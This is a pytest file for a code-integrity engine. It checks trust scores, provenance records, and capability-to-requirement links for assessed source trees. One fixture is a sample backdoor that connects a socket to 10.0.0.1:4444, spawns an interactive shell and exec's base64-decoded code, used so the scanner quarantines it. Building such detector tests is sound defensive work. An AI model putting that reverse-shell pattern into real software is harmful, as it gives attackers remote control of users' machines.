# CUI // SP-CTI
"""Tests for SIPA provenance linkage (sipa-prov-01).

Covers ``tools/integrity/provenance.py`` and its wiring into the engine:

  * **trust_score_for** — verdict / risk-score -> [0, 1] trust mapping, with the
    per-verdict caps (quarantine <= 0.20, review <= 0.60, allow uncapped).
  * **Engine integration (the acceptance criterion)** — a full ``engine.assess``
    run records a ``prov_entities`` report entity (``content_hash == dir_digest``),
    a ``prov_activities`` ``integrity_assessment`` run, a ``wasGeneratedBy``
    relation, and a ``source_citation_registry`` row carrying the trust score.
  * **Mode A** — authorized capabilities get a ``wasDerivedFrom`` edge to their
    authorizing ``requirement_id`` so ``code -> capability -> requirement`` is
    queryable in ``prov_relations``.

The pipeline runs for real against an in-memory SQLite connection; the
subprocess-backed scanner seams are stubbed exactly as in test_integrity_engine.
"""
import json
import sqlite3

import pytest

from tools.db.storage import StorageConnection
from tools.integrity import engine, provenance, scanners
from tools.integrity.db import init_db as init_db_mod


# --------------------------------------------------------------------------- #
# Fixtures — benign + backdoor source trees (mirror test_integrity_engine)
# --------------------------------------------------------------------------- #
_BENIGN_README = """\
# Tinylog

A tiny utility that reads and writes log files on disk. Nothing else — no
network, no subprocesses.
"""

_BENIGN_PY = '''\
"""Tinylog — read and write log entries to a file on disk."""
from pathlib import Path


def write_entry(path, text):
    Path(path).write_text(text, encoding="utf-8")
'''

_BACKDOOR_PY = '''\
import base64
import os
import socket
import subprocess

_BLOB = "cHJpbnQoJ3B3bmVkJyk="


def _callback():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    subprocess.call(["/bin/sh", "-i"])


def _run():
    exec(base64.b64decode(_BLOB))
'''


def _write_tree(base, files):
    base.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        (base / name).write_text(content, encoding="utf-8")
    return base


@pytest.fixture
def benign_source(tmp_path):
    return _write_tree(
        tmp_path / "benign_src",
        {"README.md": _BENIGN_README, "tinylog.py": _BENIGN_PY},
    )


@pytest.fixture
def backdoor_source(tmp_path):
    return _write_tree(tmp_path / "backdoor_src", {"helper.py": _BACKDOOR_PY})


@pytest.fixture
def conn():
    """A SQLite connection wrapped as production hands one to the SIPA engine.

    The engine authors its SQL PostgreSQL-first (``%s`` placeholders). A bare
    sqlite3.Connection rejects those — capability_extractor._persist() died
    with ``near "%": syntax error``. get_connection() returns a
    StorageConnection in production, whose translate_sql rewrites ``%s`` ->
    ``?`` for SQLite, so the wrapper is what the code under test actually sees.
    """
    raw = sqlite3.connect(":memory:")
    raw.row_factory = sqlite3.Row
    init_db_mod.init_db(raw)
    yield StorageConnection(raw, "sqlite")
    raw.close()


@pytest.fixture
def deterministic_scanners(monkeypatch, tmp_path):
    monkeypatch.setenv("ICDEV_INTEGRITY_QUARANTINE_DIR", str(tmp_path / "quarantine"))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    monkeypatch.setattr(scanners, "_invoke_scanner", lambda cmd, timeout: (0, "{}", ""))
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: None)


# --------------------------------------------------------------------------- #
# trust_score_for — pure mapping
# --------------------------------------------------------------------------- #
def test_trust_score_allow_is_high_for_low_risk():
    assert provenance.trust_score_for("allow", 0.0) == 1.0
    assert provenance.trust_score_for("allow", 10.0) == 0.9


def test_trust_score_quarantine_is_capped_low():
    # Even a gamed-down numeric score cannot push a QUARANTINE above the 0.20 cap.
    assert provenance.trust_score_for("quarantine", 0.0) == 0.20
    assert provenance.trust_score_for("quarantine", 95.0) <= 0.20


def test_trust_score_review_is_capped_mid():
    assert provenance.trust_score_for("review", 0.0) == 0.60
    assert provenance.trust_score_for("review", 80.0) <= 0.60


def test_trust_score_clamped_and_robust_to_bad_input():
    assert provenance.trust_score_for("allow", None) == 1.0
    assert provenance.trust_score_for("allow", "oops") == 1.0  # type: ignore[arg-type]
    assert 0.0 <= provenance.trust_score_for("allow", 150.0) <= 1.0


# --------------------------------------------------------------------------- #
# Engine integration — the acceptance criterion
# --------------------------------------------------------------------------- #
def test_assess_records_prov_entity_and_citation(benign_source, conn, deterministic_scanners):
    result = engine.assess(str(benign_source), conn=conn)
    aid = result["assessment_id"]

    # The assess() result surfaces the provenance handle.
    prov = result["provenance"]
    assert prov is not None
    assert prov["entity_id"] and prov["activity_id"] and prov["registry_id"]

    # The staged-tree digest the report entity is anchored to.
    dir_digest = conn.execute(
        "SELECT dir_digest FROM integrity_assessments WHERE id = ?", (aid,)
    ).fetchone()[0]
    assert dir_digest

    # 1. prov_entity — a 'report' entity fingerprinted by the dir_digest.
    erow = conn.execute(
        "SELECT entity_type, content_hash FROM prov_entities WHERE id = ?",
        (prov["entity_id"],),
    ).fetchone()
    assert erow is not None
    assert erow["entity_type"] == "report"
    assert erow["content_hash"] == dir_digest

    # 2. prov_activity — the integrity_assessment run.
    arow = conn.execute(
        "SELECT activity_type FROM prov_activities WHERE id = ?",
        (prov["activity_id"],),
    ).fetchone()
    assert arow is not None
    assert arow["activity_type"] == "integrity_assessment"

    # 3. wasGeneratedBy — report wasGeneratedBy assessment (verdict provenance).
    gen = conn.execute(
        "SELECT COUNT(*) FROM prov_relations "
        "WHERE relation_type = 'wasGeneratedBy' AND subject_id = ? AND object_id = ?",
        (prov["entity_id"], prov["activity_id"]),
    ).fetchone()[0]
    assert gen == 1

    # 4. source_citation_registry — the prov_entity registered with a trust score.
    crow = conn.execute(
        "SELECT citation_type, source_table, source_record_id, source_hash, trust_score "
        "FROM source_citation_registry WHERE id = ?",
        (prov["registry_id"],),
    ).fetchone()
    assert crow is not None
    assert crow["citation_type"] == "prov_entity"
    assert crow["source_table"] == "prov_entities"
    assert crow["source_record_id"] == prov["entity_id"]
    assert crow["source_hash"] == dir_digest
    # Benign => ALLOW => high trust.
    assert crow["trust_score"] == prov["trust_score"]
    assert crow["trust_score"] > 0.5


def test_quarantine_assessment_registers_low_trust(backdoor_source, conn, deterministic_scanners):
    result = engine.assess(str(backdoor_source), conn=conn)
    assert result["verdict"] == "quarantine"
    trust = conn.execute(
        "SELECT trust_score FROM source_citation_registry WHERE id = ?",
        (result["provenance"]["registry_id"],),
    ).fetchone()[0]
    assert trust <= 0.20


# --------------------------------------------------------------------------- #
# Mode A — capability -> requirement edges (code -> capability -> requirement)
# --------------------------------------------------------------------------- #
def test_mode_a_links_authorized_capability_to_requirement(
    backdoor_source, conn, deterministic_scanners, monkeypatch
):
    from tools.integrity import intent_reconciler

    conn.execute(
        """CREATE TABLE IF NOT EXISTS intake_requirements (
               id TEXT PRIMARY KEY, session_id TEXT, project_id TEXT, raw_text TEXT,
               requirement_type TEXT, priority TEXT, status TEXT)"""
    )
    # This requirement authorizes ONLY network egress -> network_egress becomes an
    # authorized capability tied to req-net; process_exec stays unauthorized.
    conn.execute(
        "INSERT INTO intake_requirements (id, session_id, project_id, raw_text) "
        "VALUES ('req-net', 'sess-1', 'proj-A', ?)",
        ("The agent shall send telemetry to the remote server.",),
    )
    conn.commit()
    monkeypatch.setattr(intent_reconciler, "_coverage_gaps", lambda *a, **k: [])

    result = engine.assess(str(backdoor_source), project_id="proj-A", conn=conn)
    assert result["mode"] == engine.PROVENANCE_AWARE
    aid = result["assessment_id"]
    assert result["provenance"]["authorized_edges"] >= 1

    # A wasDerivedFrom edge links the authorized network_egress capability to req-net.
    edge = conn.execute(
        "SELECT subject_id, object_id, attributes FROM prov_relations "
        "WHERE relation_type = 'wasDerivedFrom' AND object_id = ?",
        ("urn:icdev:integrity:requirement:req-net",),
    ).fetchone()
    assert edge is not None
    assert edge["subject_id"] == f"urn:icdev:integrity:capability:{aid}:network_egress"
    attrs = json.loads(edge["attributes"])
    assert attrs["capability_type"] == "network_egress"
    assert attrs["requirement_id"] == "req-net"

    # process_exec was NOT authorized -> no requirement edge for it.
    n_exec = conn.execute(
        "SELECT COUNT(*) FROM prov_relations "
        "WHERE relation_type = 'wasDerivedFrom' AND subject_id = ?",
        (f"urn:icdev:integrity:capability:{aid}:process_exec",),
    ).fetchone()[0]
    assert n_exec == 0


def test_mode_b_emits_no_requirement_edges(benign_source, conn, deterministic_scanners):
    # Provenance-blind assessments carry no capability -> requirement edges.
    result = engine.assess(str(benign_source), conn=conn)
    assert result["mode"] == engine.PROVENANCE_BLIND
    assert result["provenance"]["authorized_edges"] == 0
    n = conn.execute(
        "SELECT COUNT(*) FROM prov_relations WHERE relation_type = 'wasDerivedFrom'"
    ).fetchone()[0]
    assert n == 0
